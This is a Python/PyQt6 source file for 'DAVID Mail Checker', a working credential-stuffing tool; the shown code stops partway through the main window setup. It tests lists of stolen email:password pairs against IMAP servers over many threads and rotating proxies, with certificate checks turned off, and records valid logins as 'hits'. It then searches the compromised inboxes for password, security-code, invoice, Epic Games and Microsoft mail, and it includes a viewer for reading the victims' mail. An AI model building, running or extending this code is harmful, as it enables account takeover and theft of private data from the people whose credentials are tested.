import sys
import os
import ssl
import re
import imaplib
import socket
import threading
import time
import configparser
from queue import Queue
from datetime import datetime, timedelta
from collections import deque, defaultdict
import logging
import json
import base64
import email
from email.header import decode_header

try:
    from bs4 import BeautifulSoup
except ImportError:
    print("Warning: 'beautifulsoup4' library not found. HTML email parsing will be basic.")
    print("Please install it using: pip install beautifulsoup4")
    BeautifulSoup = None

try:
    import requests
except ImportError:
    print("Warning: 'requests' library not found. Discord notifications will be disabled.")
    print("Please install it using: pip install requests")
    requests = None

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QPushButton, QLineEdit, QLabel, QFileDialog, QProgressBar,
    QTextEdit, QCheckBox, QGroupBox, QComboBox, QMessageBox,
    QTableWidget, QTableWidgetItem, QHeaderView, QToolBar, QDialog,
    QFormLayout, QSpinBox, QTabWidget, QStatusBar, QDialogButtonBox,
    QDateEdit, QMenu, QSplitter, QListWidget, QListWidgetItem
)
from PyQt6.QtCore import (
    QThread, pyqtSignal, QObject, Qt, QTimer, QSettings, QSize, QDate
)
from PyQt6.QtGui import QIcon, QFont, QColor, QAction, QBrush, QTextCursor, QPixmap

logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(threadName)s - %(levelname)s - %(message)s',
                    handlers=[logging.FileHandler("david_mail_checker_debug.log", mode='w', encoding='utf-8')])

def create_default_domains_ini():
    if not os.path.exists('domains.ini'):
        config = configparser.ConfigParser()
        config['DEFAULT'] = {'server': 'imap.default.com', 'port': '993'}
        config['gmail.com'] = {'server': 'imap.gmail.com', 'port': '993'}
        config['yahoo.com'] = {'server': 'imap.mail.yahoo.com', 'port': '993'}
        config['outlook.com'] = {'server': 'outlook.office365.com', 'port': '993'}
        config['hotmail.com'] = {'server': 'outlook.office365.com', 'port': '993'}
        config['aol.com'] = {'server': 'imap.aol.com', 'port': '993'}
        config['icloud.com'] = {'server': 'imap.mail.me.com', 'port': '993'}
        with open('domains.ini', 'w', encoding='utf-8') as configfile:
            config.write(configfile)
        logging.info("Default 'domains.ini' created.")

APP_ICON_B64 = "iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAdNSURBVHhe7Zt/aBNXGcd/MxsxRoiiUCMiWqQoHmqv2KGlpaXU9pCiIYiCFdsPSq2gaC9FkKKgCIpaUgWlIVWKghYpUApKa0GxCkUPzSAiiChgQBBDgIEh8H/3fXlvd7e7ybv/3e/d3fePzGSTzc3uvPfe9773vXk3bwIlSpQoUaJEiRKlc/B4PFhGAbquA9d1cbjLwnEcOI4DTdM4PFs4nh2Epml+DPg+Dk5z+Lqu24vA8/1Z/8X/SyBBEAR4PB5kZ2dDD3w5R0dH8bO+E+j7y8vL2Gw2yMrKwmW9L4HruqjVagliF8M0jYx9+Pz+G+b+e7fbsdlsGAwGvOD/FkjSNJRSxHEcWJaFYRhIkyQlAWVZRhiGYLFYkJeXh6ysLDiO4+K8h5RlybbtOI4DURRBKQkRkUgkwGaz4bBYMDIygoaGBhiGAZqm/R9hRUEQBEEQBEHw8/PzJIBIJEJ2djYcPw5d19F1PZRS2O12LMsyzDQNBEHAcdzS+7Ftu83Y7XZ0XQdVVS+tT9M0VVgmk0l+fn7w9/dHlmW/S0xN00DThQs8z/t9TNM0NE373Nf3fdzF1+Pz/l8NlmX5G+B5Hk3T4DgOlGVp6n2pVDKZDFmWEcdxvu/dNE3s9jtSqRSaplEr1bBZbVEr1VCr1RCpVIjrujDNErquw2q1otlsEQRB7PrvdjuIRCJEIhGKoiiA4zj3a8ViEenp6fj+B5IkYhgGURQhSRKWZXm83iRJQqVSITs7O+y4e3yLxaLfX6FQwPb2NqqqwnEcWJaFYRhIpVIYDodYlkUsEun3r0+SRCKRCIVC/v33+XxyB3ieR5ZlSKXS3+fG4wG73Q69Xg/HcUxM+qGhoXyL1+sF0zSpVqubHwKNRgNBEBif3traiqZpGA6HH+s/8DyPH/f6vvM8b2mMx+NBFEUkEgkUCgVkWYbjuFAoFEhN07Asy89TjuNAlmVkWRbHcSAIAmw2GyKRCFdXV8jMzIRpmr+tJ5PJ3+c+n4fhcChBEDs40DTt4r16vebxeMDisMBms0EQBEilUvB9PzEx3w8PDwccx2mSJNvtyOVy2Gw2NE3D8/wvn3c8HqGqKgqFAtLSUuj1emRkZMDzPFRVRalUwszMjGf/0dHRDA8PY3x8XJblsYslSZZlGAwGmJ6eBgB4vd6l9/f7fQwGAwzD4PfP6XQiCAIsFovE5x/cbrcZnu/xeADAMAiCgFarRSqVgmEYRCIRNE2L4xgdHR1NTU1hYWFBSkpK0HUduVwOEARBEARBkGUZTdPINI3ExJdYLIa7uzo4PDyE3+/P8+F4PPB9f3bA9/3fPifLslQqFcLhMLxeL5RSNE0jSZJwHAcURWFwcBCFQgGlFLquYzQaIRQKERgM01R9n89nZmYm9no9CoUCfD4fNE0jCIKFJzAMAzMzMxiGAUNDQ1iWhSRJiMNhzMrKwmaz4fP5YBgGkiSJxWJBrVYjSRJqtRqWZYmFQhiGYWNjAwqFAlarlSW43W4oigJBEJRSzM3NIcsyVqsVURTBdV2KoihBEEilUhiNRhiNRkinUqiqiuM4yGazEQ6HSSWStJz3SqUSmqZhGAZEUcThcCAIAoZhEAqFQhLsdjuKoohEIoTDYZjNZn/edzAYIBaLUSgUkMvlGA6HH3u+2WxiamqK3d1dNE0jSZIAgKysLMzOziIMQxyOB0EQkMlkSKVSAICqqpRSBEFAkiQEQcDs7CwAYDQa4fV6kUqlSKVSJBIJhMNhNE1jGAaWZZmY9D0eDyQSCQqFAvF4nGVYn8/nd7Mmk0kwDAOBQIBwOIxpmrP+C8MwiMVifNvP5/NAlmVBEPB4PNB1HcdxyGQy32X+MAwYhsHExATsdjve3t6g6zpkMhkWiwWCIOC6Loqi+DPW7/fBNE0qleI/fXk+n4eZmRksy8Jms0GSpF+f3+8nFothcHCQpb+lUiEWi8HhcCAWi8FyudyicVUU4fv+mZg/Pj6Oqampn8/F4zHC4TBWqxWjo6NobW3FlpaW3+Wmk0qlGB0dRSKRQCAQQCKRgGVZBEHAsiw2m40kSfz+2+12aJpGEASkUimMxiP0ej2KoszzvFarxejoKAqFAtLSUv79x3EcpFIpxGIxBEFAKBTC4XAglUqh1+uRTCY/rRcsyzIUCgV+vx+TyQQA0Gq1uLq6gqZpGI1GOI4DlmUxGo1QSqWUwuVyYTAY4PP5IEmSTds+n4fhcChBEDo4cKiq+h+A7/u/XJqmIRQKkUqlGA6HiU+SRFEU/h/Av1GjUqlQo0aNGjVqFA3/Au32mr4P0xTTAAAAAElFTkSuQmCC"

def decode_mime_header(header):
    if header is None:
        return ""
    decoded_parts = decode_header(header)
    parts = []
    for part, charset in decoded_parts:
        if isinstance(part, bytes):
            try:
                parts.append(part.decode(charset or 'utf-8', errors='ignore'))
            except (LookupError, TypeError):
                parts.append(part.decode('utf-8', errors='ignore'))
        else:
            parts.append(str(part))
    return "".join(parts)

def parse_email_body(msg):
    body = ""
    if msg.is_multipart():
        for part in msg.walk():
            content_type = part.get_content_type()
            content_disposition = str(part.get("Content-Disposition"))
            
            if content_type in ["text/plain", "text/html"] and "attachment" not in content_disposition:
                try:
                    payload = part.get_payload(decode=True)
                    charset = part.get_content_charset() or 'utf-8'
                    part_body = payload.decode(charset, errors='replace')
                    if content_type == "text/html" and BeautifulSoup:
                        soup = BeautifulSoup(part_body, "html.parser")
                        body += soup.get_text()
                    else:
                        body += part_body
                    body += "\n"
                except Exception:
                    continue
    else:
        try:
            payload = msg.get_payload(decode=True)
            charset = msg.get_content_charset() or 'utf-8'
            body = payload.decode(charset, errors='replace')
            if msg.get_content_type() == "text/html" and BeautifulSoup:
                soup = BeautifulSoup(body, "html.parser")
                body = soup.get_text()
        except Exception as e:
            body = f"[Could not decode body: {e}]"
    return body

class WorkerSignals(QObject):
    progress = pyqtSignal(int, int, int, int, int)
    result = pyqtSignal(str, str, str)
    log = pyqtSignal(str, QColor)
    finished = pyqtSignal(dict, float, int)
    cpm = pyqtSignal(int)
    domain_stat = pyqtSignal(str, str)
    keyword_hit_details = pyqtSignal(str, str, str, str, list)

class CheckerWorker(QObject):
    def __init__(self, settings):
        super().__init__()
        self.settings = settings
        self.is_running = True
        self.is_paused = False
        self.lock = threading.Lock()
        self.stats = {'hits': 0, 'invalids': 0, 'errors': 0, 'checked': 0, 'keyword_hits': 0}
        self.combo_queue = Queue()
        self.proxy_queue = Queue()
        self.signals = WorkerSignals()
        self.domain_mappings = self.settings.get('domain_mappings', {})
        self.start_time = 0
        self.last_check_time = time.monotonic()
        self.checks_in_last_minute = deque(maxlen=200)

    def get_imap_server(self, domain):
        if domain in self.domain_mappings:
            mapping = self.domain_mappings[domain]
            return mapping['server'], mapping['port']
        return f"imap.{domain}", 993

    def stop(self):
        self.is_running = False

    def toggle_pause(self):
        self.is_paused = not self.is_paused

    def run(self):
        self.is_running = True
        self.start_time = time.time()
        
        output_files = {
            'hits': open(self.settings['hits_file'], 'w', encoding='utf-8'),
            'invalids': open(self.settings['invalids_file'], 'w', encoding='utf-8'),
            'keyword_hits': open(self.settings['intelligence_hits_file'], 'w', encoding='utf-8')
        }
        
        threads = []
        for _ in range(self.settings['threads']):
            thread = threading.Thread(target=self.worker_thread, args=(output_files,), daemon=True, name=f"CheckerWorker-{_+1}")
            threads.append(thread)
            thread.start()
        
        for t in threads:
            t.join()

        for f in output_files.values():
            f.close()
        
        elapsed_time = time.time() - self.start_time
        final_cpm = int((self.stats['checked'] / elapsed_time) * 60) if elapsed_time > 0 else 0
        self.signals.finished.emit(self.stats, elapsed_time, final_cpm)

    def update_cpm(self):
        now = time.monotonic()
        self.checks_in_last_minute.append(now)
        
        while self.checks_in_last_minute and self.checks_in_last_minute[0] < now - 60:
            self.checks_in_last_minute.popleft()
            
        cpm_val = len(self.checks_in_last_minute)
        self.signals.cpm.emit(cpm_val)

    def worker_thread(self, output_files):
        while self.is_running:
            while self.is_paused:
                time.sleep(0.1)
                if not self.is_running:
                    return

            try:
                combo = self.combo_queue.get(timeout=1)
            except Queue.Empty:
                if threading.main_thread().is_alive():
                    continue
                else:
                    self.is_running = False
                    break
            
            domain = ""
            try:
                email, password = combo.strip().split(self.settings['delimiter'])
                domain = email.split('@')[1]
                server, port = self.get_imap_server(domain)
                self.check_combo(email, password, server, port, output_files, domain)
            except ValueError:
                self.log_and_update(f"Skipping malformed line: {combo}", QColor("orange"))
                with self.lock:
                    self.stats['errors'] += 1
            except Exception as e:
                self.log_and_update(f"Worker error on {combo}: {e}", QColor("red"))
                if domain:
                    self.signals.domain_stat.emit(domain, "error")
                with self.lock:
                    self.stats['errors'] += 1
            finally:
                with self.lock:
                    self.stats['checked'] += 1
                self.signals.progress.emit(
                    self.stats['checked'], self.stats['hits'], self.stats['invalids'], 
                    self.stats['errors'], self.stats['keyword_hits']
                )
                self.update_cpm()
                self.combo_queue.task_done()
        
    def log_and_update(self, msg, color):
        logging.info(msg)
        self.signals.log.emit(msg, color)

    def check_combo(self, email_addr, password, server, port, output_files, domain):
        combo_str = f"{email_addr}:{password}"
        proxy = None
        original_socket = socket.socket
        try:
            if self.settings['use_proxies'] and not self.proxy_queue.empty():
                proxy_line = self.proxy_queue.get()
                proxy_parts = proxy_line.strip().split(':')
                p_host, p_port = proxy_parts[0], int(proxy_parts[1])

                def create_connection(address, timeout=None, source_address=None):
                    sock = socket.create_connection((p_host, p_port), timeout)
                    connect_str = f"CONNECT {address[0]}:{address[1]} HTTP/1.1\r\nHost: {address[0]}\r\n\r\n"
                    sock.sendall(connect_str.encode())
                    response = sock.recv(4096).decode()
                    if "200 Connection established" not in response:
                        raise ConnectionError("HTTP Proxy CONNECT failed")
                    return sock

                socket.socket = create_connection
                proxy = f"{p_host}:{p_port}"
                self.proxy_queue.put(proxy_line)

            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            with imaplib.IMAP4_SSL(host=server, port=port, ssl_context=context, timeout=self.settings['timeout']) as imap_server:
                typ, data = imap_server.login(email_addr, password)
                if typ == 'OK':
                    with self.lock:
                        self.stats['hits'] += 1
                    output_files['hits'].write(combo_str + '\n')
                    output_files['hits'].flush()
                    self.signals.result.emit("hit", combo_str, f"Server: {server}")
                    self.signals.domain_stat.emit(domain, "hit")
                    self.log_and_update(f"HIT -> {combo_str}", QColor("lime"))
                    
                    if self.settings['intelligence_search_enabled']:
                        self.search_inbox(imap_server, email_addr, output_files)
                else:
                    raise imaplib.IMAP4.error(data[0].decode())

        except (imaplib.IMAP4.error, imaplib.IMAP4.abort) as e:
            with self.lock:
                self.stats['invalids'] += 1
            output_files['invalids'].write(combo_str + '\n')
            output_files['invalids'].flush()
            details = "Invalid Credentials" if "authentication failed" in str(e).lower() else str(e)
            self.signals.result.emit("invalid", combo_str, details)
            self.signals.domain_stat.emit(domain, "invalid")
            self.log_and_update(f"INVALID -> {combo_str} ({details})", QColor("red"))
        except (socket.timeout, TimeoutError, ConnectionRefusedError, socket.gaierror) as e:
            with self.lock:
                self.stats['errors'] += 1
            details = f"{type(e).__name__}" + (f" (Proxy: {proxy})" if proxy else "")
            self.signals.result.emit("error", combo_str, details)
            self.signals.domain_stat.emit(domain, "error")
            self.log_and_update(f"ERROR -> {combo_str} ({details})", QColor("orange"))
        except Exception as e:
            with self.lock:
                self.stats['errors'] += 1
            details = str(type(e).__name__) + (f" (Proxy: {proxy})" if proxy else "")
            self.signals.result.emit("error", combo_str, details)
            self.signals.domain_stat.emit(domain, "error")
            self.log_and_update(f"ERROR -> {combo_str} ({details}: {e})", QColor("orange"))
        finally:
            socket.socket = original_socket
    
    def _build_nested_or_query(self, criteria):
        if not criteria:
            return "(ALL)"
        if len(criteria) == 1:
            return criteria[0]
        
        return f"(OR {criteria[0]} {self._build_nested_or_query(criteria[1:])})"

    def search_inbox(self, imap_server, email_addr, output_files):
        try:
            senders = [s.strip() for s in self.settings['intelligence_senders'].split('\n') if s.strip()]
            keywords = [k.strip() for k in self.settings['intelligence_keywords'].split('\n') if k.strip()]
            
            search_in_subject = self.settings['search_in_subject']
            search_in_body = self.settings['search_in_body']
            
            if not any([senders, keywords]):
                return
            
            search_parts = []
            if senders:
                search_parts.extend([f'(FROM "{s}")' for s in senders])
            
            if keywords:
                if search_in_subject:
                    search_parts.extend([f'(SUBJECT "{k}")' for k in keywords])
                if search_in_body:
                    search_parts.extend([f'(BODY "{k}")' for k in keywords])

            if not search_parts:
                return

            search_query = self._build_nested_or_query(search_parts)
            fetch_count = self.settings['intelligence_emails_to_fetch']

            for mailbox in self.settings['intelligence_mailboxes'].split(','):
                try:
                    imap_server.select(f'"{mailbox.strip()}"', readonly=True)
                    
                    typ, data = imap_server.search(None, search_query)
                    if typ != 'OK' or not data[0]:
                        continue
                    
                    uids = data[0].split()
                    self.log_and_update(f"Found {len(uids)} potential matches in '{mailbox}' for {email_addr}. Analyzing...", QColor("cyan"))

                    fetched_emails_for_account = defaultdict(list)

                    for uid in uids[-fetch_count:]:
                        typ, msg_data = imap_server.fetch(uid, '(RFC822)')
                        if typ != 'OK':
                            continue
                        
                        raw_email = msg_data[0][1]
                        email_message = email.message_from_bytes(raw_email)
                        
                        subject = decode_mime_header(email_message['Subject'])
                        from_ = decode_mime_header(email_message['From'])
                        date_ = decode_mime_header(email_message['Date'])
                        body = parse_email_body(email_message)

                        email_content = {
                            'subject': subject, 'from': from_, 'date': date_, 'body': body,
                            'headers': "".join(f"{k}: {v}\n" for k, v in email_message.items())
                        }
                        
                        for sender in senders:
                            if sender.lower() in from_.lower():
                                fetched_emails_for_account[sender].append(email_content)
                        for keyword in keywords:
                            if (search_in_subject and keyword.lower() in subject.lower()) or \
                               (search_in_body and keyword.lower() in body.lower()):
                                fetched_emails_for_account[keyword].append(email_content)
                    
                    if fetched_emails_for_account:
                        with self.lock:
                            self.stats['keyword_hits'] += 1
                        
                        for match_detail, details_list in fetched_emails_for_account.items():
                            match_type = "Sender" if match_detail in senders else "Keyword"
                            # Ensure no duplicate emails for the same match detail
                            unique_details = [dict(t) for t in {tuple(d.items()) for d in details_list}]
                            self.signals.keyword_hit_details.emit(email_addr, match_type, match_detail, mailbox.strip(), unique_details)
                            output_files['keyword_hits'].write(f"{email_addr}|{match_type}|{match_detail}|{mailbox.strip()}|{len(unique_details)} emails fetched\n")
                            output_files['keyword_hits'].flush()

                except imaplib.IMAP4.error:
                    continue
        except Exception as e:
            self.log_and_update(f"Intelligence search failed for {email_addr}: {e}", QColor("red"))

class IMAPClientSignals(QObject):
    error = pyqtSignal(str)
    mailboxes_loaded = pyqtSignal(list)
    emails_loaded = pyqtSignal(list)
    email_content_loaded = pyqtSignal(dict)

class IMAPClient(QObject):
    def __init__(self, email, password, server, parent=None):
        super().__init__(parent)
        self.email = email
        self.password = password
        self.server = server
        self.signals = IMAPClientSignals()
        self.imap = None

    def connect(self):
        try:
            context = ssl.create_default_context()
            self.imap = imaplib.IMAP4_SSL(self.server, ssl_context=context)
            typ, data = self.imap.login(self.email, self.password)
            if typ == 'OK':
                return True
            else:
                self.signals.error.emit(f"Login failed: {data[0].decode()}")
                return False
        except Exception as e:
            self.signals.error.emit(f"Connection failed: {e}")
            return False

    def list_mailboxes(self):
        if not self.imap: return
        try:
            typ, mailboxes_data = self.imap.list()
            mailboxes = []
            if typ == 'OK':
                for mbox in mailboxes_data:
                    parts = mbox.decode().split(' "." ')
                    if len(parts) == 2:
                        name = parts[1].strip().replace('"', '')
                        mailboxes.append(name)
            self.signals.mailboxes_loaded.emit(mailboxes)
        except Exception as e:
            self.signals.error.emit(f"Failed to list mailboxes: {e}")

    def fetch_emails(self, mailbox, search_term=None, count=100):
        if not self.imap: return
        try:
            self.imap.select(f'"{mailbox}"', readonly=True)
            
            search_query = 'ALL'
            if search_term:
                search_query = f'(OR (FROM "{search_term}") (SUBJECT "{search_term}") (BODY "{search_term}"))'

            typ, data = self.imap.search(None, search_query)
            if typ != 'OK':
                self.signals.error.emit(f"Failed to search in {mailbox}")
                return
            
            email_ids = data[0].split() if data[0] else []
            emails = []
            for uid in reversed(email_ids[-count:]):
                typ, msg_data = self.imap.fetch(uid, '(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM DATE)])')
                if typ == 'OK':
                    msg = email.message_from_bytes(msg_data[0][1])
                    emails.append({
                        'uid': uid.decode(),
                        'subject': decode_mime_header(msg['subject']),
                        'from': decode_mime_header(msg['from']),
                        'date': decode_mime_header(msg['date'])
                    })
            self.signals.emails_loaded.emit(emails)
        except Exception as e:
            self.signals.error.emit(f"Failed to fetch emails from {mailbox}: {e}")

    def fetch_email_content(self, uid):
        if not self.imap: return
        try:
            typ, msg_data = self.imap.fetch(uid, '(RFC822)')
            if typ == 'OK':
                raw_email = msg_data[0][1]
                email_message = email.message_from_bytes(raw_email)
                body = parse_email_body(email_message)
                headers = "".join(f"{k}: {v}\n" for k, v in email_message.items())
                self.signals.email_content_loaded.emit({'body': body, 'headers': headers})
        except Exception as e:
            self.signals.error.emit(f"Failed to fetch email content for UID {uid}: {e}")

    def disconnect(self):
        if self.imap:
            try:
                self.imap.logout()
            except Exception:
                pass


class SettingsDialog(QDialog):
    def __init__(self, settings_manager, parent=None):
        super().__init__(parent)
        self.settings_manager = settings_manager
        self.setWindowTitle("Settings")
        self.setMinimumWidth(550)
        self.layout = QVBoxLayout(self)
        
        tabs = QTabWidget()
        self.layout.addWidget(tabs)
        
        general_tab = QWidget()
        proxy_tab = QWidget()
        intelligence_tab = QWidget()
        discord_tab = QWidget()

        tabs.addTab(general_tab, "General")
        tabs.addTab(proxy_tab, "Proxy")
        tabs.addTab(intelligence_tab, "Intelligence Search")
        tabs.addTab(discord_tab, "Discord")

        self.init_general_tab(general_tab)
        self.init_proxy_tab(proxy_tab)
        self.init_intelligence_tab(intelligence_tab)
        self.init_discord_tab(discord_tab)
        
        self.buttons = QDialogButtonBox(QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel)
        self.buttons.accepted.connect(self.accept)
        self.buttons.rejected.connect(self.reject)
        self.layout.addWidget(self.buttons)
        
        self.load_settings()

    def init_general_tab(self, tab):
        layout = QFormLayout(tab)
        self.threads_spinbox = QSpinBox()
        self.threads_spinbox.setRange(1, 500)
        self.timeout_spinbox = QSpinBox()
        self.timeout_spinbox.setRange(1, 120)
        self.timeout_spinbox.setSuffix(" s")
        self.delimiter_edit = QLineEdit()
        self.hits_file_edit = QLineEdit()
        self.invalids_file_edit = QLineEdit()

        layout.addRow("Threads:", self.threads_spinbox)
        layout.addRow("IMAP Timeout:", self.timeout_spinbox)
        layout.addRow("Combo Delimiter:", self.delimiter_edit)
        layout.addRow("Hits File:", self.hits_file_edit)
        layout.addRow("Invalids File:", self.invalids_file_edit)

    def init_proxy_tab(self, tab):
        layout = QFormLayout(tab)
        self.use_proxies_checkbox = QCheckBox("Enable Proxies")
        layout.addRow(self.use_proxies_checkbox)

    def init_intelligence_tab(self, tab):
        layout = QVBoxLayout(tab)
        self.intelligence_search_checkbox = QCheckBox("Enable Intelligence Search on Hits")
        layout.addWidget(self.intelligence_search_checkbox)

        self.search_options_group = QGroupBox("Search Criteria")
        form_layout = QFormLayout(self.search_options_group)

        self.senders_edit = QTextEdit()
        self.senders_edit.setPlaceholderText("One sender email/domain per line")
        self.senders_edit.setToolTip("Enter email addresses or domains to match in the 'From' field.")
        self.senders_edit.setMinimumHeight(80)
        
        self.keywords_edit = QTextEdit()
        self.keywords_edit.setPlaceholderText("One keyword per line")
        self.keywords_edit.setToolTip("Enter keywords to search for in email subject and/or body.")
        self.keywords_edit.setMinimumHeight(80)

        search_locations_layout = QHBoxLayout()
        self.search_in_subject_cb = QCheckBox("Subject")
        self.search_in_body_cb = QCheckBox("Body")
        search_locations_layout.addWidget(self.search_in_subject_cb)
        search_locations_layout.addWidget(self.search_in_body_cb)

        self.mailboxes_edit = QLineEdit()
        self.mailboxes_edit.setToolTip("Comma-separated list of mailboxes to search in (e.g., INBOX,Spam)")

        self.fetch_count_spinbox = QSpinBox()
        self.fetch_count_spinbox.setRange(1, 100)
        self.fetch_count_spinbox.setSuffix(" emails")
        self.fetch_count_spinbox.setToolTip("Maximum number of emails to retrieve for each found match.")

        self.intelligence_hits_file_edit = QLineEdit()

        form_layout.addRow("Senders:", self.senders_edit)
        form_layout.addRow("Keywords:", self.keywords_edit)
        form_layout.addRow("Search In:", search_locations_layout)
        form_layout.addRow("Mailboxes:", self.mailboxes_edit)
        form_layout.addRow("Fetch Count:", self.fetch_count_spinbox)
        form_layout.addRow("Hits File:", self.intelligence_hits_file_edit)
        
        layout.addWidget(self.search_options_group)
        self.intelligence_search_checkbox.toggled.connect(self.search_options_group.setEnabled)


    def init_discord_tab(self, tab):
        layout = QFormLayout(tab)
        self.discord_enabled_checkbox = QCheckBox("Enable Discord Webhook Notifications")
        self.discord_webhook_url_edit = QLineEdit()
        self.discord_webhook_url_edit.setEchoMode(QLineEdit.EchoMode.Password)
        
        layout.addRow(self.discord_enabled_checkbox)
        layout.addRow("Webhook URL:", self.discord_webhook_url_edit)
        if not requests:
            disabled_label = QLabel("Disabled ('requests' library not found)")
            disabled_label.setStyleSheet("color: orange;")
            layout.addRow(disabled_label)
            self.discord_enabled_checkbox.setEnabled(False)

    def load_settings(self):
        s = self.settings_manager
        self.threads_spinbox.setValue(s.value("threads", 50, type=int))
        self.timeout_spinbox.setValue(s.value("timeout", 10, type=int))
        self.delimiter_edit.setText(s.value("delimiter", ":"))
        self.hits_file_edit.setText(s.value("hits_file", "hits.txt"))
        self.invalids_file_edit.setText(s.value("invalids_file", "invalids.txt"))
        self.use_proxies_checkbox.setChecked(s.value("use_proxies", False, type=bool))
        
        is_intel_enabled = s.value("intelligence_search_enabled", False, type=bool)
        self.intelligence_search_checkbox.setChecked(is_intel_enabled)
        self.search_options_group.setEnabled(is_intel_enabled)

        self.senders_edit.setText(s.value("intelligence_senders", "epicgames.com\naccount@microsoft.com"))
        self.keywords_edit.setText(s.value("intelligence_keywords", "password\ninvoice\nsecurity code"))
        self.search_in_subject_cb.setChecked(s.value("search_in_subject", True, type=bool))
        self.search_in_body_cb.setChecked(s.value("search_in_body", True, type=bool))
        self.mailboxes_edit.setText(s.value("intelligence_mailboxes", "INBOX,Spam"))
        self.fetch_count_spinbox.setValue(s.value("intelligence_emails_to_fetch", 5, type=int))
        self.intelligence_hits_file_edit.setText(s.value("intelligence_hits_file", "intelligence_hits.txt"))
        
        self.discord_enabled_checkbox.setChecked(s.value("discord_enabled", False, type=bool))
        self.discord_webhook_url_edit.setText(s.value("discord_webhook_url", ""))

    def accept(self):
        s = self.settings_manager
        s.setValue("threads", self.threads_spinbox.value())
        s.setValue("timeout", self.timeout_spinbox.value())
        s.setValue("delimiter", self.delimiter_edit.text())
        s.setValue("hits_file", self.hits_file_edit.text())
        s.setValue("invalids_file", self.invalids_file_edit.text())
        s.setValue("use_proxies", self.use_proxies_checkbox.isChecked())
        
        s.setValue("intelligence_search_enabled", self.intelligence_search_checkbox.isChecked())
        s.setValue("intelligence_senders", self.senders_edit.toPlainText())
        s.setValue("intelligence_keywords", self.keywords_edit.toPlainText())
        s.setValue("search_in_subject", self.search_in_subject_cb.isChecked())
        s.setValue("search_in_body", self.search_in_body_cb.isChecked())
        s.setValue("intelligence_mailboxes", self.mailboxes_edit.text())
        s.setValue("intelligence_emails_to_fetch", self.fetch_count_spinbox.value())
        s.setValue("intelligence_hits_file", self.intelligence_hits_file_edit.text())

        s.setValue("discord_enabled", self.discord_enabled_checkbox.isChecked())
        s.setValue("discord_webhook_url", self.discord_webhook_url_edit.text())
        super().accept()

class IntelligenceReportDialog(QDialog):
    def __init__(self, email_details, match_type, match_detail, parent=None):
        super().__init__(parent)
        self.email_details = email_details
        self.setWindowTitle(f"Intelligence Report: {match_type} - {match_detail}")
        self.setMinimumSize(900, 700)

        main_layout = QVBoxLayout(self)
        splitter = QSplitter(Qt.Orientation.Horizontal)
        main_layout.addWidget(splitter)

        self.email_list_widget = QListWidget()
        self.email_list_widget.setMaximumWidth(350)
        splitter.addWidget(self.email_list_widget)

        details_widget = QWidget()
        details_layout = QVBoxLayout(details_widget)
        self.details_tabs = QTabWidget()
        details_layout.addWidget(self.details_tabs)
        
        self.body_view = QTextEdit()
        self.body_view.setReadOnly(True)
        
        self.headers_view = QTextEdit()
        self.headers_view.setReadOnly(True)
        self.headers_view.setFont(QFont("Courier New", 10))

        self.details_tabs.addTab(self.body_view, "Email Body")
        self.details_tabs.addTab(self.headers_view, "Full Headers")

        splitter.addWidget(details_widget)
        splitter.setSizes([250, 650])

        self.email_list_widget.currentItemChanged.connect(self.display_email_content)
        self.populate_email_list()

    def populate_email_list(self):
        for i, detail in enumerate(self.email_details):
            subject = detail.get('subject', 'No Subject')
            date = detail.get('date', 'No Date')
            item_text = f"Subject: {subject[:40]}...\nDate: {date}"
            item = QListWidgetItem(item_text, self.email_list_widget)
            item.setData(Qt.ItemDataRole.UserRole, i)

        if self.email_details:
            self.email_list_widget.setCurrentRow(0)

    def display_email_content(self, current, previous):
        if current is None:
            return
        
        index = current.data(Qt.ItemDataRole.UserRole)
        email_data = self.email_details[index]

        body = f"From: {email_data.get('from', '')}\n" \
               f"Subject: {email_data.get('subject', '')}\n" \
               f"Date: {email_data.get('date', '')}\n" \
               f"--- BODY ---\n\n{email_data.get('body', '')}"
        
        self.body_view.setText(body)
        self.headers_view.setText(email_data.get('headers', ''))

class DomainViewerDialog(QDialog):
    def __init__(self, domain_mappings, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Domain IMAP Mappings")
        self.setMinimumSize(600, 400)

        self.layout = QVBoxLayout(self)
        self.table = QTableWidget()
        self.layout.addWidget(self.table)
        
        self.table.setColumnCount(4)
        self.table.setHorizontalHeaderLabels(["Domain", "IMAP Server", "Port", "Source"])
        self.table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        self.table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        self.table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)

        self.populate_table(domain_mappings)

    def populate_table(self, domain_mappings):
        self.table.setRowCount(len(domain_mappings))
        for row, (domain, data) in enumerate(sorted(domain_mappings.items())):
            self.table.setItem(row, 0, QTableWidgetItem(domain))
            self.table.setItem(row, 1, QTableWidgetItem(data['server']))
            self.table.setItem(row, 2, QTableWidgetItem(str(data['port'])))
            
            source_item = QTableWidgetItem(data['source'])
            color = QColor("cyan") if data['source'] == "Custom" else QColor("white")
            source_item.setForeground(color)
            self.table.setItem(row, 3, source_item)

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("DAVID Mail Checker")
        self.setGeometry(100, 100, 1200, 800)
        
        pixmap = QPixmap()
        pixmap.loadFromData(base64.b64decode(APP_ICON_B64))
        self.setWindowIcon(QIcon(pixmap))
        
        self.settings = QSettings("DAVID_MailChecker", "App")
        
        self.worker = None
        self.worker_thread = None
        self.imap_client = None
        self.imap_thread = None

        self.is_running = False
        self.is_paused = False
        self.combos_loaded = 0
        self.proxies_loaded = 0

        self.ini_domains = {}
        self.custom_domains = {}
        self.final_domains = {}
        self.domain_stats_data = defaultdict(lambda: {'total': 0, 'hits': 0})
        
        create_default_domains_ini()
        self._load_ini_domains()
        self._update_final_domains()

        self.init_ui()
        self.init_actions()
        self.apply_stylesheet()
        
    def init_ui(self):
        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        self.main_layout = QVBoxLayout(self.central_widget)

        self.init_menu_bar()

